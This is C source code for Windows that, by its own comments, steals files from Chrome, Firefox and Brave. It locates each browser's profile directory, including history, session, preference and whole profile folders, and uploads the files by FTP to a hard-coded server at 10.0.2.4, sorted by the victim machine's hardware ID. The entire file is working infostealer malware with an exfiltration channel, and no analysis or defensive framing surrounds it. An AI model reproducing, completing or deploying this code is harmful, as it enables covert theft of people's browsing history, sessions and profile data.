#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <wininet.h>
#include <versionhelpers.h>
//attempts to steal files from chrome, brave, firefox
//with chrome, it steals files & then the program breaks for some reason
int main() {
	char *path = getenv("USERPROFILE");
	HW_PROFILE_INFO uuid;
	GetCurrentHwProfileA(&uuid);
	DWORD rtn = 0;
	HINTERNET initial, ftp;
	//rtn = GetFileVersionInfoSizeA("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", NULL);
	rtn = GetFileVersionInfoSizeA("chroma.exe", NULL);
	if (rtn != 0) {
		
		strcat(path, "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\");
		char *files[4] = {"History", "Last Session", "Last Tabs", "Preferences"};

		HINTERNET initial, ftp;
		WIN32_FIND_DATA location;
		int sucofail;
		
		SetCurrentDirectoryA(path);
		
		initial = InternetOpenA("ursakta", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
		ftp = InternetConnectA(initial, "10.0.2.4", INTERNET_DEFAULT_FTP_PORT, "ftpsecure", "ftpsecure", INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
		sucofail = FtpSetCurrentDirectoryA(ftp, uuid.szHwProfileGuid);
		if (sucofail == 0) {
			FtpCreateDirectoryA(ftp, uuid.szHwProfileGuid);
			FtpSetCurrentDirectoryA(ftp, uuid.szHwProfileGuid);
		}
		for (int i=0; i<=3; i++) {
			FindFirstFileA(files[i], &location);
			FtpPutFileA(ftp, location.cFileName, location.cFileName, FTP_TRANSFER_TYPE_BINARY, 0);
		}
	}
	else if (rtn == 0) {
		
		rtn = GetFileVersionInfoSizeA("C:\\Program Files (x86)\\Mozilla Firefox\\Firefox.exe", NULL);
		//rtn = GetFileVersionInfoSizeA("chroma.exe", NULL);
		if (rtn != 0) {
			
			
			WIN32_FIND_DATA location;
			char *profile = getenv("APPDATA");
			char currentdir[100];
			HINTERNET initial, ftp;
			int conretVal;
			int checkdir;
			SetCurrentDirectoryA(profile);
			SetCurrentDirectoryA("Mozilla\\Firefox\\Profiles");
			GetCurrentDirectoryA(100, currentdir);
			strcat(currentdir, "\\*");
			
			initial = InternetOpenA("ursakta", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
			ftp = InternetConnectA(initial, "10.0.2.4", INTERNET_DEFAULT_FTP_PORT, "ftpsecure", "ftpsecure", INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
			conretVal = FtpSetCurrentDirectory(ftp, uuid.szHwProfileGuid);
			if (conretVal == 0) {
				FtpCreateDirectory(ftp, uuid.szHwProfileGuid);
				FtpSetCurrentDirectory(ftp, uuid.szHwProfileGuid);
			}
			FtpPutFileA(ftp, "log.txt", "log.txt", FTP_TRANSFER_TYPE_BINARY, 0);
			HANDLE finder = FindFirstFileA(currentdir, &location);
			if (finder != INVALID_HANDLE_VALUE) {
				//avoiding . & .. files
				FindNextFile(finder, &location);
				FindNextFile(finder, &location);
				SetCurrentDirectoryA(location.cFileName);
				GetCurrentDirectoryA(100, currentdir);
				strcat(currentdir, "\\*");
				HANDLE finder2 = FindFirstFileA(currentdir, &location);
				//loop through all files in dir & send them off
				do 
				{
					FtpPutFileA(ftp, location.cFileName, location.cFileName, FTP_TRANSFER_TYPE_BINARY, 0);
				} while (FindNextFile(finder2, &location));
			}
		} else if (rtn == 0) {
			
			rtn = GetFileVersionInfoSizeA("C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", NULL);
			if (rtn !=0) {
				//steal brave browser files
				
				HINTERNET initial, ftp;
				WIN32_FIND_DATA location;
				int sucofail;
				char *path = getenv("USERPROFILE");
				char currentdir[100];
				SetCurrentDirectoryA(path);
				SetCurrentDirectoryA("AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default");
				GetCurrentDirectoryA(100, currentdir);
				strcat(currentdir, "\\*");
				char *folders[3] = {"Session Storage", "AutofillStrikeDatabase", "GPUCache"};
				initial = InternetOpenA("ursakta", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
				ftp = InternetConnectA(initial, "10.0.2.4", INTERNET_DEFAULT_FTP_PORT, "ftpsecure", "ftpsecure", INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
				sucofail = FtpSetCurrentDirectory(ftp, uuid.szHwProfileGuid);
				if (sucofail == 0) {
					FtpCreateDirectoryA(ftp, uuid.szHwProfileGuid);
					FtpSetCurrentDirectoryA(ftp, uuid.szHwProfileGuid);
				}
				
				char ftphomedir[100];
				DWORD charcnt;
				FtpGetCurrentDirectoryA(ftp, ftphomedir, &charcnt);
				//creating directories from folders var
				for (int i=0; i<=2; i++) {
					sucofail = FtpSetCurrentDirectory(ftp, folders[i]);
					if (sucofail == 0) {
						FtpCreateDirectoryA(ftp, folders[i]);
					}
					else {
						FtpSetCurrentDirectory(ftp, ftphomedir);
					}
				}
				//currentdir var contains dir to iterate through
				HANDLE finder = FindFirstFileA(currentdir, &location);				
				if (finder != INVALID_HANDLE_VALUE) {
					FindNextFile(finder, &location);
					FindNextFile(finder, &location);
					do 
					{
						FtpPutFileA(ftp, location.cFileName, location.cFileName, FTP_TRANSFER_TYPE_BINARY, 0);
					} while (FindNextFile(finder, &location));
				}
			} else if (rtn == 0){
				//search for another browser
				printf("Searching another dir\n");
			}
		}

	}

			


}
